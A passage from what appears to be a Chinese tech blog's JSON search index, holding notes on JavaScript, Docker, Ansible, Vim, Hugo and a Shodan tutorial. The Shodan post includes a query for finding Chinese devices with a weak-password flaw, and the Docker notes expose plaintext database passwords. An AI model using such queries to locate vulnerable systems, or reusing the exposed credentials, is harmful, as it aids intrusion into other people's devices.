Date(value) // value 为毫秒时间戳\n\t\tnew Date(year, month[, day[, hour[, minutes[, seconds[, milliseconds]]]]]); // 注意月份是从 0 开始的\n\n\t新建日期对象时必须按照构造函数方式使用 new ,如果以常规方法方式调用 Date() ，那么只会返回字符串，而不是日期对象。和其它 JavaScript 对象不同，日期对象没有 literal syntax。\n\n获取毫秒数\n\n\t\tDate.now() // 返回当前时间的毫秒数。\n\t\tdateObj.valueOf() // 返回特定时间的毫秒数。\n\n获取字符串表示\n\n\t\tdateObj.totoISOString() // 格式：2016-01-20T02:32:35.959Z\n\t\ta.toLocaleString() // 格式：2016/1/20 上午10:32:35\n\t\ta.toLocaleDateString() // 格式：2016/1/20\n\n 正则\n\n新建正则\n\n\t\tvar expression=/pattern/flags\n\t\tvar pattern=new RegExp(\"[bc]at\",\"i\") // 传给RegExp构造函数的两个参数都是字符串（不能把正则表达式字面量传递给构造函数）\n\n\t模式中使用的所有元字符都需要转义。元字符包括：\n\n\t\t（[{\\^$|)?*+.]}\n\n\t由于RegExp构造函数的模式参数是字符串，所以在某些情况下要对字符进行双重转义。所有元字符都必须双重转义，那些已经转移过的字符也是如此。\n\n类型检测\n\n 检测原始值\njavascript有5种原始类型：字符串、数字、布尔值、null、undefined。\n\n如果你希望一个值是字符串、数字、布尔值、undefined。最佳选择是typeof。对应的返回值为\"string\",\"number\",\"boolean\",\"undefined\"\n\ntypeof varialbe\n\n最后一个原始值，null，一般不应用于检测语句。但有一个例外，如果所期望的值真的为null，可以使用=== 或者!== 来和null来比较。\n\ntypeof null 返回\"object\"，不要使用这种方式，直接用恒等运算符。\n\n检测引用值\n\njavascript除了原始值之外都是引用值。包括Object、Array、Date和Error。typeof 这些引用类型时，都会返回\"object\"\n\n检测引用值使用instanceof\n\n 检测函数\n检测数组\n\nECMAScript 5\n\nArray.isArray()\n 检测属性\n使用in运算符\n\nif(\"count\" in object){\n\ta=object.count\n}\n\n注意：在coffeescript中用in判断数据在数组中是否出现, 而 of 可以探测 JavaScript 对象的属性是否存在.","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/container_heap","title":"golang中container/heap包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Other/2016-02-29 阿里云服务器","title":"阿里云","text":"---\niguocai\n 初始化\ndocker run --rm -it --name mysqliguocai  -p 3306:3306 -v $HOME/docker/linyibr/iguocai/mysql:/var/lib/mysql -e MYSQLROOTPASSWORD=iguocai2017 -e MYSQLDATABASE=iguocai -e MYSQLUSER=iguocai -e MYSQLPASSWORD=iguocai2017 mysql\n\ndocker run --rm --name phpmyadmin  -p 222:80 --link mysqliguocai:db phpmyadmin/phpmyadmin\n\ndocker run -it --rm --name phpiguocai -p 80:80 --link mysqliguocai:mysql -v /root/docker/linyibr/iguocai/master:/var/www/html trafex/alpine-nginx-php7\n\ndocker run -it --rm --name nginxiguocai -p 80:80 --link phpiguocai:phpfpm nginx\n\nrsync -avzH /home/ubuntu/docker/linyibr/iguocai/master/ root@demo.linyibr.com:/root/docker/linyibr/iguocai/master\nliuzhishan\ndocker run --rm -it --name yishuimysql  -p 3306:3306 -v $HOME/docker/yishui/mysql:/var/lib/mysql -e MYSQLROOTPASSWORD=toor -e MYSQLDATABASE=yishui mysql\ndocker run --rm --name phpmyadmin  -p 8080:80 --link yishuimysql:db phpmyadmin/phpmyadmin\n\ndocker run -ti --rm --name yishuiapache --link yishuimysql:mysql -p 80:80  -v $HOME/docker/yishui/onethink:/var/www/html rinetd/php:apache\n\nyimengapp.com\ndocker run -d --restart=always --name yimengmysql  -p 3306:3306 -v /var/www/yimeng/mysql:/var/lib/mysql mysql:5.6\ndocker run -td --restart=always --name yimengapache --link yimengmysql:mysql -p 80:80 -v /var/www/yimeng/Uploads/:/var/www/html/Uploads/ -v /var/www/yimeng/www-data:/var/www/html rinetd/php:apache\n\nwuye\ngit clone git@git.oschina.net:keyixinxi/wuye.git ~/docker/wuye/master\n启动 mysql docker run -d --restart=always --name wuyemysql  -p 3306:3306 -v ~/docker/wuye/mysql:/var/lib/mysql -e MYSQLROOTPASSWORD=toor -e MYSQLDATABASE=sanyang mysql:5.6\n导入数据 docker exec -i wuyemysql mysql -uroot -ptoor sanyang ","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/strings","title":"golang中strings包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Post/ansible/2016-01-02 Linux命令 ansible","title":"Linux命令 Ansible","text":"Ansible中文权威指南\n\ngithub.com/mrlesmithjr\n\n安装最新的ansible\n$ sudo easyinstall pip\n$ sudo pip install ansible\n\n 配置文件 ansible.cfg 加载路径\n用户可以修改一下配置文件来修改设置,他们的被读取的顺序如下:\nANSIBLECONFIG (一个环境变量)\nansible.cfg (位于当前目录中)\n.ansible.cfg (位于家目录中)\n/etc/ansible/ansible.cfg\n\nsomehost         ansiblesshport=2222     ansiblesshuser=manager\n\npamlimits\nansible all -m shell -a \"ulimit -HSn 65535\"\nansible all -m pamlimits -a \"domain= limittype=- limititem=nofile value=65536\"\nansible all -m pamlimits -a \"domain= limittype=hard limititem=nofile value=65536\"\n\n 时间同步chrony\n ansible-galaxy install influxdata.chrony\n\nmariadb 集群\nansible-galaxy install mrlesmithjr.mariadb-galera-cluster mrlesmithjr.etc-hosts\n/etc/ansible/roles/mrlesmithjr.mariadb-galera-cluster","tags":null},{"location":"//blog.pytool.com/Hacker/01_信息搜集/2016-03-29 搜索引擎Shodan","title":"Shodan","text":"Shodan新手入坑指南 - FreeBuf.COM | 关注黑客与极客\n使用搜索过滤\n\n如果像前面单纯只使用关键字直接进行搜索，搜索结果可能不尽人意，那么此时我们就需要使用一些特定的命令对搜索结果进行过滤，常见用的过滤命令如下所示：\n\n    hostname：搜索指定的主机或域名，例如 hostname:\"google\"\n    port：搜索指定的端口或服务，例如 port:\"21\"\n    country：搜索指定的国家，例如 country:\"CN\"\n    city：搜索指定的城市，例如 city:\"Hefei\"\n    org：搜索指定的组织或公司，例如 org:\"google\"\n    isp：搜索指定的ISP供应商，例如 isp:\"China Telecom\"\n    product：搜索指定的操作系统/软件/平台，例如 product:\"Apache httpd\"\n    version：搜索指定的软件版本，例如 version:\"1.6.2\"\n    geo：搜索指定的地理位置，参数为经纬度，例如 geo:\"31.8639, 117.2808\"\n    before/after：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:\"11-11-15\"\n    net：搜索指定的IP地址或子网，例如 net:\"210.45.240.0/24\"\n\n搜索实例\n\n查找位于合肥的 Apache 服务器：apache city:\"Hefei\"\n\n查找位于国内的 Nginx 服务器：nginx country:\"CN\"\n\n查找 GWS(Google Web Server) 服务器：\"Server: gws\" hostname:\"google\"\n\n查找指定网段的华为设备：huawei net:\"61.191.146.0/24\"\n\n咱们随便选取一个名为“NetSureveillance Web”的用户分享语法，从下面的描述信息我们基本就能得知这就是一个弱密码的漏洞，为了方便测试让我们把语法在增加一个国家的过滤信息，最终语法如下：\n\nServer: uc-httpd 1.0.0 200 OK Country:\"CN\"\n\nShodan Exploits\n\n命令行下使用 Shodan\n\nShodan 是由官方提供的 Python 库的，项目位于：https://github.com/achillean/shodan-python\n\n安装\n\npip install shodan\n\n或者\n\ngit clone https://github.com/achillean/shodan-python.git \u0026\u0026 cd shodan-python\npython setup.py install\n\n安装完后我们先看下帮助信息：\n\n➜  ~ shodan -h\nUsage: shodan [OPTIONS] COMMAND [ARGS]...\nOptions:\n  -h, --help  Show this message and exit.\nCommands:\n  alert       Manage the network alerts for your account  # 管理账户的网络提示\n  convert     Convert the given input data file into a...  # 转换输入文件\n  count       Returns the number of results for a search  # 返回查询结果数量\n  download    Download search results and save them in a...  # 下载查询结果到文件\n  honeyscore  Check whether the IP is a honeypot or not.  # 检查 IP 是否为蜜罐\n  host        View all available information for an IP...  # 显示一个 IP 所有可用的详细信息\n  info        Shows general information about your account  # 显示账户的一般信息\n  init        Initialize the Shodan command-line  # 初始化命令行\n  myip        Print your external IP address  # 输出用户当前公网IP\n  parse       Extract information out of compressed JSON...  # 解析提取压缩的JSON信息，即使用download下载的数据\n  scan        Scan an IP/ netblock using Shodan.  # 使用 Shodan 扫描一个IP或者网段\n  search      Search the Shodan database  # 查询 Shodan 数据库\n  stats       Provide summary information about a search...  # 提供搜索结果的概要信息\n  stream      Stream data in real-time.  # 实时显示流数据\n\n常用示例\n\ninit\n\n初始化命令行工具。\n\n➜  ~ shodan init [APIKey]\nSuccessfully initialized\n\ncount\n\n返回查询的结果数量。\n\n➜  ~ shodan count microsoft iis 6.0\n575862\n\ndownload\n\n将搜索结果下载到一个文件中，文件中的每一行都是 JSON 格式存储的目标 banner 信息。默认情况下，该命令只会下载1000条结果，如果想下载更多结果需要增加 --limit 参数。\n\n27-6.png\n\nparse\n\n我们可以使用 parse 来解析之前下载数据，它可以帮助我们过滤出自己感兴趣的内容，也可以用来将下载的数据格式从 JSON 转换成 CSV 等等其他格式，当然更可以用作传递给其他处理脚本的管道。例如，我们想将上面下载的数据以CSV格式输出IP地址、端口号和组织名称：\n\n➜  ~ shodan parse --fields ipstr,port,org --separator , microsoft-data.json.gz\n\n27-7.png\n\nhost\n\n查看指定主机的相关信息，如地理位置信息，开放端口，甚至是否存在某些漏洞等信息。\n\n27-8.png\n\nsearch\n\n直接将查询结果展示在命令行中，默认情况下只显示IP、端口号、主机名和HTTP数据。当然我们也可以通过使用 –fields 来自定义显示内容，例如，我们只显示IP、端口号、组织名称和主机名：\n\n➜  ~ shodan search --fields ipstr,port,org,hostnames microsoft iis 6.0\n\n27-9.png\n代码中使用 Shodan 库\n\n还是使用上一节讲到的 shodan 库，安装方式这里不在阐述了。同样的，在使用 shodan 库之前需要初始化连接 API，代码如下：\n\nimport shodan\nSHODANAPIKEY = \"APIKey\"\napi = shodan.Shodan(SHODANAPIKEY)\n\n随后，我们就可以搜索数据了，示例代码片如下：\n\ntry:\n    # 搜索 Shodan\n    results = api.search('apache')\n    # 显示结果\n    print 'Results found: %s' % results['total']\n    for result in results['matches']:\n            print result['ipstr']\nexcept shodan.APIError, e:\n    print 'Error: %s' % e\n\n27-13.png\n\n这里 Shodan.search() 会返回类似如下格式的 JSON 数据：\n\n{\n        'total': 8669969,\n        'matches': [\n                {\n                        'data': 'HTTP/1.0 200 OK\\r\\nDate: Mon, 08 Nov 2010 05:09:59 GMT\\r\\nSer...',\n                        'hostnames': ['pl4t1n.de'],\n                        'ip': 3579573318,\n                        'ipstr': '89.110.147.239',\n                        'os': 'FreeBSD 4.4',\n                        'port': 80,\n                        'timestamp': '2014-01-15T05:49:56.283713'\n                },\n                ...\n        ]\n}\n\n常用 Shodan 库函数\n\n    shodan.Shodan(key) ：初始化连接API\n    Shodan.count(query, facets=None)：返回查询结果数量\n    Shodan.host(ip, history=False)：返回一个IP的详细信息\n    Shodan.ports()：返回Shodan可查询的端口号\n    Shodan.protocols()：返回Shodan可查询的协议\n    Shodan.services()：返回Shodan可查询的服务\n    Shodan.queries(page=1, sort='timestamp', order='desc')：查询其他用户分享的查询规则\n    Shodan.scan(ips, force=False)：使用Shodan进行扫描，ips可以为字符或字典类型\n    Shodan.search(query, page=1, limit=None, offset=None, facets=None, minify=True)：查询Shodan数据\n\n至此，本文基本告于段落，买了 Shodan Membership 的各位朋友们可以好好的去 Happy 啦。","tags":null},{"location":"//blog.pytool.com/Post/数据库/2016-02-29 服务器 SQL语句大全","title":"SQL语句大全","text":"---\nSQL语句大全\n\n一、创建和删除数据库\n1、创建用户\n//创建用户且置密码，在MySQL中行，但在Oracle中行","tags":null},{"location":"//blog.pytool.com/Reship/2015-11-19-understanding-javascript-function-invocation-and-this","title":"理解 JavaScript 的函数调用和 this","text":"JavaScript 函数调用方式以及 this 的含义让很多人感到困惑。\n\n在我看来，可以通过理解函数调用的核心原语（primitive），然后把其他调用方式看成核心原语之上的语法糖，来消除这些困惑。事实上，这也是 ECMAScript 规范看待函数调用的方式。在某些方面，本文是规范的简化，但是基本意思是相同的。\n\n核心原语 the core primitive\n\n首先，来看函数调用的核心原语，函数的 call 方法[1]。\n\n参数中，下标 1 到最后的元素组成参数列表(argList)\n第一个参数是 thisValue\n调用函数，把 this 设置为 thisValue,argList 作为参数列表\n\n例如：\n\nfunction hello(thing) {  \n  console.log(this + \" says hello \" + thing);\n}\n\nhello.call(\"Yehuda\", \"world\") //=  Yehuda says hello world \n\n如上所示，调用 hello 方法，this 设置为 \"Yehuda\" 同时只有一个参数 \"world\"。这就是 JavaScript 函数调用的核心原语。你可以把其他方式脱糖（desugaring）为核心原语。\n\n1] 在 [ES5 规范中, call 方法是用其它词汇描述的，用更低级的原语，call 方法只是对它进行了简单地包装，这里是为了简化，更多信息参见文章末尾。\n\n 简单函数调用\n\n很明显，每次都要使用 call 来调用函数是很烦人的。所以 JavaScript 允许我们用括号语法来直接调用函数 hellow(\"world\")。这种调用方式可以脱糖为：\n\nfunction hello(thing) {  \n  console.log(\"Hello \" + thing);\n}\n\n// this:\nhello(\"world\")\n\n// desugars to:\nhello.call(window, \"world\");  \n\n在 ECMAScript 5，严格模式下[2]，上面的行为发生了变化：\n\n// this:\nhello(\"world\")\n\n// desugars to:\nhello.call(undefined, \"world\");  \n\n简短的说：函数调用 fn(...args) 等同于 fn.call(window [ES5-strict: undefined], ...args)。\n\n注意：对 functions declared inline 也是这样 (function() {})() 等同于 (function() {}).call(window [ES5-strict: undefined)\n\n[2] Actually, I lied a bit. The ECMAScript 5 spec says that undefined is (almost) always passed, but that the function being called should change its thisValue to the global object when not in strict mode. This allows strict mode callers to avoid breaking existing non-strict-mode libraries.\n\n成员函数\n\n接下来，另一种常见方式是作为对象的成员函数调用。在这种情况下，脱糖为：\n\nvar person = {  \n  name: \"Brendan Eich\",\n  hello: function(thing) {\n    console.log(this + \" says hello \" + thing);\n  }\n}\n\n// this:\nperson.hello(\"world\")\n\n// desugars to this:\nperson.hello.call(person, \"world\");  \n\n需要注意的是，至于 hello 方法是如何附加到对象上的并不会影响上面的行为。上面的例子是初始化对象时定义方法。下面来看，动态的将方法附加到对象上：\n\nfunction hello(thing) {  \n  console.log(this + \" says hello \" + thing);\n}\n\nperson = { name: \"Brendan Eich\" }  \nperson.hello = hello;\n\nperson.hello(\"world\") // still desugars to person.hello.call(person, \"world\")\n\nhello(\"world\") // \"[object DOMWindow]world\"  \n\n需要注意的是：函数并不存在持久的 this 值。this 的值是在运行时，基于调用方式进行设定的。\n\n 使用 Function.prototype.bind\n\n有时候，函数具有一个持久的 this 值是很方便的。过去，人们经常利用闭包来将一个函数转化为一个 this 值不变的函数：\n\nvar person = {  \n  name: \"Brendan Eich\",\n  hello: function(thing) {\n    console.log(this.name + \" says hello \" + thing);\n  }\n}\n\nvar boundHello = function(thing) { return person.hello.call(person, thing); }\n\nboundHello(\"world\");  \n\n尽管 boundHello 仍然会被脱糖为 boundHello.call(window, \"world\")。但是，我们利用 call 方法将 this 值改为我们需要的。\n\n为了更加通用，稍作修改：\n\nvar bind = function(func, thisValue) {  \n  return function() {\n    return func.apply(thisValue, arguments);\n  }\n}\n\nvar boundHello = bind(person.hello, person);  \nboundHello(\"world\") // \"Brendan Eich says hello world\"  \n\n为了理解上面的代码，你需要两点信息：首先，arguments 是一个 array-like 对象，代表了传给函数的所有参数。其次，apply 方法和 call 方法几乎一样，除了它是接受一个 array-like 对象而不是一次性列出所有参数。\n\n我们的 bind 方法返回一个新函数。调用它时，新函数会调用原本传入的函数，并按照传入的参数设定 this 值。\n\n由于这是很常见的用法，所以ES5 在所有 Function 对象上引入了 bind 方法，实现了这一行为：\n\nvar boundHello = person.hello.bind(person);  \nboundHello(\"world\") // \"Brendan Eich says hello world\"  \n\n当你需要将一个函数传递做为回调时，bind 会更有用:\n\nvar person = {  \n  name: \"Alex Russell\",\n  hello: function() { console.log(this.name + \" says hello world\"); }\n}\n\n$(\"#some-div\").click(person.hello.bind(person));\n\n// when the div is clicked, \"Alex Russell says hello world\" is printed\n\n当然，这样很笨拙，TC39 将会提出更优雅的方案。\n\n在 jQuery\n\n由于 jQuery 大量使用了匿名回调函数，在内部，它使用 call 方法将这些回调函数的 this 值设置为更有用的值。例如：在所有事件处理器中，jQuery 调用 call 方法将 this 的值设置为绑定事件处理器的元素，而不是接受 window 作为 this 值。\n\n这非常有用，因为在匿名回调函数中，this 的默认值不是特别的有用。\n\n PS: I Cheated\n\n为了简化，便于理解，上面的用词并不是很准确。Probably the most important cheat is the way I called func.call a \"primitive\". In reality, the spec has a primitive (internally referred to as [[Call]]) that both func.call and [obj.]func()use.\n\n我们来看下 func.call 的定义：\n\nIf IsCallable(func) is false, then throw a TypeError exception.\nLet argList be an empty List.\nIf this method was called with more than one argument then in left to right order starting with arg1 append each argument as the last element of argList\nReturn the result of calling the [[Call]] internal method of func, providing thisArg as the this value and argList as the list of arguments.\n\n原文地址：http://yehudakatz.com/2011/08/11/understanding-javascript-function-invocation-and-this/","tags":null},{"location":"//blog.pytool.com/Edit/vim best Tips0","title":"vim 最佳实践","text":"简单的那些「set xxx」之类的命令就不提了，先从 map 开始吧。\nmap 命令的用途是把一组键映射为其他的命令。\n例如我想在按「;」键的时候，自动变成「:」键进入命令行模式，就可以这样设置：\n\nmap ; :\n\nVim 的搜索模式太古怪，我比较习惯 Python 的风格，所以可以把「/」替换成「/\\v」，变成 very magic 模式：\n\nmap / /\\v\n\n还有设置了 hlsearch 后，搜索结果就一直高亮了，切换它又比较麻烦。还好我习惯没事多按几次 Esc 键，所以可以在按 Esc 键时清空搜索寄存器，这样就不会再高亮搜索结果了：\n\nmap Esc Esc:let @/=\"\"CR\n\n这样设置后，虽然效果达到了，可是引入了一个副作用：方向键的行为变得很诡异了。搜了下原因，好像是方向键也会触发 Esc 键，而且好像没法解决。于是只好换个快捷键了：\n\nlet mapleader=\",\"\nmap Leader/ :let @/=\"\"CR\n\nmapleader 是自定义命令的起始键，一般都定义成逗号。因为「/」离「,」比较近，而且表示搜索的意思，所以我就把快捷键设为「,/」了。如果为了方便的话，「,,」或「,Space」会更快。\n\n你会发现这个设置在普通模式和可视模式下都可用，但是插入模式下并不会生效。\n如果要针对某个模式的话，需要加上这个模式的前缀，常用的有 nmap、vmap、imap 和 cmap 等，分别适用于普通、可视、插入和命令行模式。\n例如我在插入模式的时候，想回到上一个单词，一般需要按下 Esc 进入普通模式，再按 b 到上一个单词，然后按 i 进入插入模式。于是可以把这些操作绑定到 Ctrl + b 快捷键上：\n\nimap C-b Escbi\n\n然而你在使用时会遇到问题，按 Esc 键从插入模式返回普通模式时，会让光标左移一位，再按 b 有可能就定位错误了。这种情况下，就可以用 Ctrl + o 来临时切换到普通模式，在执行完 b 命令后，会自动回到插入模式：\n\nimap C-b C-ob\n\n如果想让 Esc 键不让光标左移，可以这样设置：\n\nimap Esc C-o:stopinsertCR\n\n另外，回退一个单词用这个快捷键也是有效的：\n\nimap C-b S-Left\n\n不过我直接按 Shift + ← 并没反应，原因是大部分终端模拟器并不能区分 Shift 和不可见字符的组合。另外，CMD 键也是不可用的。如果非要使用这二者的话，只能用 MacVim。\n由于 MBP 上没有 Home 键，因此这样回到行首也是可行的：\n\nimap C-a Home\n\n接着又出现了一个问题，假设我把 Home 键设置成回到页首：\n\nimap Home C-ogg\n\n然后我按 Ctrl + a 时，也会回到页首，而不是行首了，这种不可控的事是程序员不愿意遇到的。\n所以要加上 nore 这个前缀，以确保替换成的命令是不会因其他设置而改动的：\n\ninoremap C-a Home\n\n如果要问什么时候该加 nore，答案是如果你没把握，那就加上。\n\n目前为止，一切看上去都很正常，但是好像又有什么不对：为什么我在普通模式替换的是普通按键，而在插入模式替换的却是快捷键？\n前半个问题很好回答：因为没这个必要，在普通模式下，我只需要像普通的命令一样连续按键就行了，为什么要用快捷键这种需要同时按住多个按键的方式？\n后半个问题则主要是识别问题：插入模式下，按下按键需要立刻输出到屏幕上，如果要判断是否是一个命令，就得等待一段时间，确认不是命令后才能输出，导致输入体验不佳。\n以下面的例子为例，假设我想按 2 下引号，就在当前单词的前后各插入一个引号：\n\ninoremap \"\" C-oviwvC-ob\"C-oeC-oa\"\n\n只要快速按 2 下引号，大部分时候确实是能用的；但如果我只是想输入一个引号，就会看到等一秒后光标位置才会右移（虽然并不妨碍我继续输入后面的字符）。\n不过，如果只有一个按键，不需要等待匹配下一个，那就不会影响输入体验了。例如自动补全括号和引号：\n\ninoremap ( ()Left\ninoremap [ []Left\ninoremap { {}Left\ninoremap \" \"\"Left\ninoremap ' ''Left\n\n而在命令行模式下，一般都要敲入回车才真正执行一条命令，但 cmap 会让匹配的命令立刻执行，不需要敲入回车，这也显得比较诡异。\n所以大部分情况下，插入模式和命令行模式都只定义一些快捷键的 map。\n\n另外，map 还能加一些特殊参数：\n\n    buffer 表示只对当前文件有效。\n    nowait 表示不等待范围更大的组合匹配。例如同时定义这两组：\n\n    nnoremap Leaderwd dw\n    nnoremap buffer nowait Leaderw w\n\n    如果没有加「nowait」，按下「,w」后，要等一段时间确认之后你接下来要按的不是「d」，才会执行。加了之后就不会等待，而是直接执行了，缺点就是「,wd」会失效。\n    silent 表示不在命令行显示输入的命令。\n\n其他不是很常用，就不说了。\n\n说完 map 后，再回到之前未解决的一个问题：命令行模式下，如何自定义命令？\n这就该轮到 command 出场了。\n以保存文件为例，有时候打开了一些系统文件，编辑完后却发现不能保存，要输入一段很长的代码才能用 sudo 来保存。\n现在就用 :W 命令（必须以大写字母开头）来简化这个操作：\n\ncommand W :w !sudo tee %\n\n无论怎样，它至少是能用的，但是保存时会出现一个确认界面，有点难看，于是这样去掉：\n\ncommand W :silent w !sudo tee %\n\n可如果设置了检查文件是否改动，保存完后还会提示你文件被修改了。于是可以用 execute 命令来执行，执行完后再用 :e! 来编辑：\n\ncommand W :execute 'silent w !sudo tee %' | :e!\n\n还有个不爽之处是命令行仍然会闪动一下，输出一片内容然后很快消失掉，可以将输出重定向到 /dev/null 来解决：\n\ncommand W :execute 'silent w !sudo tee %   /dev/null' | :e!\n\n再把 :WQ 给加上：\n\ncommand WQ :execute 'silent w !sudo tee %   /dev/null' | :q!\n\n或者偷下懒，在 :W 命令后再执行 :q：\n\ncommand WQ :execute 'W' | :q\n\n最后，如果设置了自动重新载入 .vimrc 文件，重复加载时会报命令已经定义过的错误。把 command 改成 command! 即可解决。\n\n接着再来说说自动执行的问题。\n大部分的编程语言里都用制表符来缩进，而 Python 通常使用 4 个空格。这种情况下，就可以用 autocmd 来解决：\n\nautocmd FileType python set expandtab\n\n当检测到文件类型为 python 时，就会设置 expandtab，把 Tab 展成空格了。\n不过再打开其他文件时，仍然是用空格来缩进，于是需要把 set 改成 setlocal，让它只针对当前 buffer 和 window 有效。\n另外，和 command 一样，重新加载 .vimrc 文件时，这个事件会再次被绑定，于是会重复执行两次。解决办法是把它加入一个组：\n\naugroup pythonindent\n    autocmd!\n    autocmd FileType python setlocal expandtab\naugroup END\n\n其中，autocmd! 会先清空这个组，而后面的 autocmd 会重新绑定事件。\n\n另一种做法是直接使用 autocmd! 来绑定事件，和 command! 一样，它也会替换之前绑定的事件。\n例如这样的设置：\n\nautocmd! BufNewFile .py call append(0, \"test\")\nautocmd! BufNewFile .py call append(0, \"\\# -- coding: utf-8 --\")\n\n只有后一句会生效。\n\n顺带一提，自动重新加载 .vimrc 文件也可以用 autocmd 来实现的：\n\naugroup reloadvimconfig\n    autocmd!\n    autocmd BufWritePost $MYVIMRC source $MYVIMRC\naugroup END\n\n再来一个比较复杂点的，保存某些类型的文件时，自动去掉行尾的空格：\n\naugroup striptralingspaces\n    autocmd!\n    autocmd BufWritePre .py,.js,.css %s/\\s\\+$//e\naugroup END\n\n如果想让读取时也去掉空格，可以把第三行改成\n\nautocmd BufRead,BufWritePre .css,.js,.py %s/\\s\\+$//e\n\n也就是说，这后面跟的多个事件是「或」的关系。\n如果需要「与」的关系，可以用多个 autocmd：\n\nautocmd FileType css,javascript,python autocmd BufWritePre buffer %s/\\s\\+$//e\n\n还能加上 if 来判断：\n\nautocmd BufWritePre * if index(['css', 'javascript', 'python'], \u0026filetype)   = 0 | %s/\\s\\+$//e\n\n其中，\u0026filetype 或 \u0026ft 是当前文件的类型，index 函数可以用来检查是否在列表中。\n\n虽然列出了那么多种方法，但其实都没能解决一个问题：删除空格后，光标位置变了。\n在编写 Vimscript 时，不带来副作用也是很重要的一点。而为了解决这个问题，就不得不保存原位置，修改完后再恢复了：\n\nfunction! SIDStripTrailingSpaces()\n    let l = line(\".\")\n    let c = col(\".\")\n    %s/\\s\\+$//e\n    call cursor(l, c)\nendfunction\naugroup striptraling_spaces\n    autocmd!\n    autocmd FileType css,javascript,python autocmd BufWritePre buffer call SIDStripTrailingSpaces()\naugroup END\n\n其中，function 后的叹号和 command! 的作用一样，重复定义时覆盖之前的定义。SID 会被替换成一个唯一的值，避免命名冲突。\n另外，如果函数名没有加范围前缀（例如 s: 表示本地函数，g: 表示全局函数），则必须大写。\n\n然后再聊聊复制粘贴的问题。\n用 Vim 的人应该都有过把代码粘贴到 Vim 里后，缩进变得乱七八糟的经历。\n原因就是直接用 CMD + v 粘贴时，会模拟成用户的输入，而在设置了自动缩进的情况下，缩进就变乱了。\n解决起来其实很简单，一种办法是 :set paste 后再粘贴，贴完后再 :set nopaste；另一种办法是直接用 p 来粘贴，但这要求 Vim 能访问系统剪贴板；此外，OS X 上还能调用 pbpaste 这个外部命令来粘贴。\n第一种办法因为我没法在 MBP 上绑定 CMD + v 快捷键，所以就不管了。\n第二种办法需要 Vim 在编译时带上了 +clipboard。可以用 vim --version | grep clipboard 来查看，包含 +clipboard 则表示没问题，-clipboard 则表示不支持。OS X 自带的 Vim 是不支持的，用 brew 安装，或者 MacVim 是带了的。确认支持后，这样设置即可：\n\nset clipboard+=unnamed\ninoremap C-p C-op\n\n要注意的是，剪贴板与 Vim 共用后，Vim 中所有的复制操作都会修改剪贴板内容。而且 Vim 的删除命令也有复制的副作用，所以很可能一不小心就把剪贴板弄乱了。如果要将一个单词替换成剪贴板的内容，ceC-p 是不行的，得用 vep。\n第三种办法则这样实现：\n\nif has(\"mac\")\n    inoremap C-p C-o:r !pbpasteCR\nendif\n\nhas(\"mac\") 可以判断是不是 OS X，:r !pbpaste 则是读取 pbpaste 这个外部命令的输出，并插入到光标位置。\n这个办法不跨平台，而且要调用外部命令，所以相对而言还是第二种比较好。但\n\n还有一点美中不足的是，如果贴进来的代码和现有代码使用的缩进方式不一致（比如一个用空格，一个用 Tab），仍然会有问题。\n好在 Vim 提供了 retab 这个命令，只要在粘贴后，再执行下它就行了：\n\ninoremap C-p C-opC-o:retabCR\nnnoremap silent p p:retabCR\n\n然而故事的结尾，我还是用回了 PyCharm。\n原因是 Vim 下最强大的代码补全插件 YouCompleteMe，也无法满足我的需求：from xxx import yyy 中，yyy 部分是无法补全的。\n回到 PyCharm 后，我的感觉是配置 Vim 的过程像是自己在实现编辑器的各个功能，而 PyCharm 则是大部分都配好了，稍微改改就行了，很多时候比 Vim 更好用（例如随便一个编辑器都几乎不用为粘贴头疼）。当然，后者的缺点就是很多地方无法定制（虽然 Vim 也不是完全可定制的），例如我想在保存文件时删除末尾的空格，但是不处理 markdown 文件；还有复制粘贴时，按照当前文件的类型，自动重新格式化 Tab 和 Space。\n为了尽量追上 Vim 的速度，还不得不再记一些快捷键（例如 Shift + CMD + o 和 CMD + e 可以快速打开文件），禁用没用的插件，隐藏编辑区和 Tab 区以外的区域等。\n此外还发现 PyCharm 的 Vim 插件可以读取 ~/.ideavimrc 配置文件，不过基本只能定义 map，其中最需要加上的是设置是：\n\nvnoremap \u003c ","tags":null},{"location":"//blog.pytool.com/hugo/hugo_markdown","title":"Hugo 中的 Markdown 语法","text":"---\n\n简介\n\nHugo 中用于书写的标记语言主要是 Markdown。Markdown 作为一门标记语言，其核心语法十分精炼易用，有许多优秀的 Markdown 解释器可以将 Markdown 文档转换为 HTML 等便于阅览的文档。Markdown 的巨大优势在于，将内容创作和内容展示剥离开来，给予内容创作者极大的自由。\n\n不过 Markdown 的核心语法十分精炼，甚至某些功能是不被支持，比如任务列表。为此开发者们，开发出众多解释器来扩展 Markdown 核心语法。Hugo 支持两个 Markdown 扩展语法（解释器）：Blackfriday 和 Mmark。可以将 Blackfriday 看成是对基本 Markdown 语法的简单扩展，Mmark 是 Markdown 语法的超集。Hugo 通过文档后缀名或者文档头 Front Matter markup 来识别这两类 Markdown 文档。Blackfriday Markdown 文档后缀名为 .md 或者 markup=\"markdown\" ，Mmark Markdown 文档后缀名为 .mmark 或者 markup=\"mmark\"。\n\n 配置 Markdown 解释器\n\nHugo 允许我们配置解释器，来扩展 Markdown 语法，改变解释器的工作过程。由于 Mmark 是 Markdown 语法的超集，语言本身就支持许多特色功能，是无需通过配置来扩展的，因此这里所说的配置是针对 Blackfriday 解释器而言的。更多关于 Mmark 语法参见此处。\n\n如何配置\n\n既可以对解释器进行全局配置，也可以针对一个文档进行配置。全局配置是通过在网站配置文件中添加 blackfriday 配置项来实现的，而针对文档的配置是通过文档头 Front Matter 中添加 blackfriday 配置项来实现的，且后者配置的优先级高于前者。\n\n配置项 blackfriday  又由许多配置子项组成的，因此 blackfriday 的配置内容会被写为一个分组，下面分别用 TOML 和 YAML 语法来做样例：\n\n[blackfriday]\n  angledQuotes = true\n  fractions = false\n  plainIDAnchors = true\n  extensions = [\"hardLineBreak\"]\n\nblackfriday:\n  angledQuotes: true\n  fractions: false\n  plainIDAnchors: true\n  extensions:\n    hardLineBreak\n\n不论是全局配置还是针对文档的配置，只要添加以上配置内容就可以改变 Markdown 解释器的行为。\n\n 常用配置项\n\ntaskLists，默认为 true 。控制是否支持 Github 风格的任务列表语法\nsmartypants，默认为 